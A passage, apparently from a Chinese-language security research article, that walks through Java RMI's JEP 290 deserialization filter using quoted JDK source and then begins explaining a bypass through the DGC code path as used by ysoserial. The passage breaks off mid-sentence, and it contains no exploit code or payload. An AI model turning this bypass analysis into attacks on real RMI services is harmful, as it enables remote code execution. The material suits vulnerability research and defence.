 *          {@link ObjectInputFilter.Status#REJECTED} if rejected,
 *          otherwise {@link ObjectInputFilter.Status#UNDECIDED}
 */
private static ObjectInputFilter.Status registryFilter(ObjectInputFilter.FilterInfo filterInfo) {
    if (registryFilter != null) {
        ObjectInputFilter.Status status = registryFilter.checkInput(filterInfo);
        if (status != ObjectInputFilter.Status.UNDECIDED) {
            // The Registry filter can override the built-in white-list
            return status;
        }
    }

    if (filterInfo.depth() > REGISTRY_MAX_DEPTH) {
        return ObjectInputFilter.Status.REJECTED;
    }
    Class<?> clazz = filterInfo.serialClass();
    if (clazz != null) {
        if (clazz.isArray()) {
            // Arrays are REJECTED only if they exceed the limit
            return (filterInfo.arrayLength() >= 0 && filterInfo.arrayLength() > REGISTRY_MAX_ARRAY_SIZE)
                ? ObjectInputFilter.Status.REJECTED
                : ObjectInputFilter.Status.UNDECIDED;
        }
        if (String.class == clazz
                || java.lang.Number.class.isAssignableFrom(clazz)
                || Remote.class.isAssignableFrom(clazz)
                || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)
                || UnicastRef.class.isAssignableFrom(clazz)
                || RMIClientSocketFactory.class.isAssignableFrom(clazz)
                || RMIServerSocketFactory.class.isAssignableFrom(clazz)
                || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)
                || java.rmi.server.UID.class.isAssignableFrom(clazz)) {
            return ObjectInputFilter.Status.ALLOWED;
        } else {
            return ObjectInputFilter.Status.REJECTED;
        }
    }
    return ObjectInputFilter.Status.UNDECIDED;
}
```
从代码中看到不允许过长的数组，如果是非`String`对象，则必须在白名单中。白名单内容如下

- `String.class`
- `Remote.class`
- `Proxy.class`
- `UnicastRef.class`
- `RMIClientSocketFactory.class`
- `RMIServerSocketFactory.class`
- `ActivationID.class`
- `UID.class`

`JEP290`本是`JDK9`的产物，但是`Oracle`官方做了向下移植的处理，把`JEP290`的机制移植到了以下三个版本以及其修复后的版本中：

- `Java SE Development Kit 8, Update 121 (JDK 8u121)`
- `Java SE Development Kit 7, Update 131 (JDK 7u131)`
- `Java SE Development Kit 6, Update 141 (JDK 6u141)`

JEP290机制允许开发人员自定义过滤器，并且这个过滤器会作用于对反序列化的调用中。具体被调用方法位置位于`ObjectInputStream#filterCheck`
```java
/**
 * Invoke the serialization filter if non-null.
 * If the filter rejects or an exception is thrown, throws InvalidClassException.
 *
 * @param clazz the class; may be null
 * @param arrayLength the array length requested; use {@code -1} if not creating an array
 * @throws InvalidClassException if it rejected by the filter or
 *        a {@link RuntimeException} is thrown
 */
private void filterCheck(Class<?> clazz, int arrayLength)
        throws InvalidClassException {
    if (serialFilter != null) {
        RuntimeException ex = null;
        ObjectInputFilter.Status status;
        // Info about the stream is not available if overridden by subclass, return 0
        long bytesRead = (bin == null) ? 0 : bin.getBytesRead();
        try {
            status = serialFilter.checkInput(new FilterValues(clazz, arrayLength,
                    totalObjectRefs, depth, bytesRead));
        } catch (RuntimeException e) {
            // Preventive interception of an exception to log
            status = ObjectInputFilter.Status.REJECTED;
            ex = e;
        }
        if (status == null  ||
                status == ObjectInputFilter.Status.REJECTED) {
            // Debug logging of filter checks that fail
            if (Logging.infoLogger != null) {
                Logging.infoLogger.info(
                        "ObjectInputFilter {0}: {1}, array length: {2}, nRefs: {3}, depth: {4}, bytes: {5}, ex: {6}",
                        status, clazz, arrayLength, totalObjectRefs, depth, bytesRead,
                        Objects.toString(ex, "n/a"));
            }
            InvalidClassException ice = new InvalidClassException("filter status: " + status);
            ice.initCause(ex);
            throw ice;
        } else {
            // Trace logging for those that succeed
            if (Logging.traceLogger != null) {
                Logging.traceLogger.finer(
                        "ObjectInputFilter {0}: {1}, array length: {2}, nRefs: {3}, depth: {4}, bytes: {5}, ex: {6}",
                        status, clazz, arrayLength, totalObjectRefs, depth, bytesRead,
                        Objects.toString(ex, "n/a"));
            }
        }
    }
}
```
如果有可用的过滤器，则会调用它对反序列化的数据进行检查。`Registry`中对过滤器的创建和设置分别位于`Registry`的静态变量区域，并在调用构造函数时使用。
```java
private static final ObjectInputFilter registryFilter = (ObjectInputFilter)AccessController.doPrivileged(RegistryImpl::initRegistryFilter);
```
而设置则位于`UnicastServerRef#unmarshalCustomCallData`方法中
```java
protected void unmarshalCustomCallData(ObjectInput var1) throws IOException, ClassNotFoundException {
    if (this.filter != null && var1 instanceof ObjectInputStream) {
        final ObjectInputStream var2 = (ObjectInputStream)var1;
        AccessController.doPrivileged(new PrivilegedAction<Void>() {
            public Void run() {
                Config.setObjectInputFilter(var2, UnicastServerRef.this.filter);
                return null;
            }
        });
    }
}
```
在前面分析所用的旧版本`JDK`中，这个方法是没有任何逻辑内容。
### JEP 290机制绕过
相要绕过，就要绕过前述白名单。意味着要在白名单中的类及其子类中寻找可利用的点。这里先介绍`ysoserial`中使用的方式，涉及到`DGC`的通信过程，这个在之前提到过它的作用。
既然过滤器的设置位于`UnicastServerRef#unmarshalCustomCallData()`中，那么一种绕过思路就是，找到一个让数据流不经过该方法的调用链，并且最终指向反序列化方法。`unmarshalCustomCallData()`方法会在`UnicastServerRef#dispatch()`方法中被调用，而这又是`RMI`数据处理的必经之路，这就导致从这里找利用变得有些困难了。
回看前面章节介绍的`DGC`功能，提到了`2`个对象`DGCImpl_Stub`和`DGCImpl_Skel`，其中`DGCImpl_Stub`中有多处对`readObject()`的调用，结合对整个交互过程的分析，可以尝试利用它来进行攻击。首先需要明确`DGC`位于`Server`端，这意味着需要知道`Server`端的端口



